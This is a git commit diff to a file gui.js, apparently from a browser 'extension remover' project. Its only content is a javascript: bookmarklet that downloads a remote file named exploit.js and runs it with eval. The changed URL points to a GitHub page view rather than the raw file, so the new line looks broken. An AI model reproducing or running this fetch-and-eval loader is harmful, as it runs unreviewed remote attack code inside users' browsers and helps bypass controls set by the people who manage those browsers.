468c8dacc9165f49757cbaf997132632eb51c1e9
ASHENWINDS <102755939+taSENv@users.noreply.github.com>
2023-01-19 15:19:53 -0500

    Update gui.js

--- gui.js
+++ gui.js
@@ -1,1 +1,1 @@
-javascript:void fetch(`https:raw.githubusercontent.com/taSENv/ext-remover-1/main/exploit.js`).then(d=>d.text()).then(eval);
+javascript:void fetch(`https://github.com/taSENv/ext-remover-1/blob/main/exploit.js`).then(d=>d.text()).then(eval);
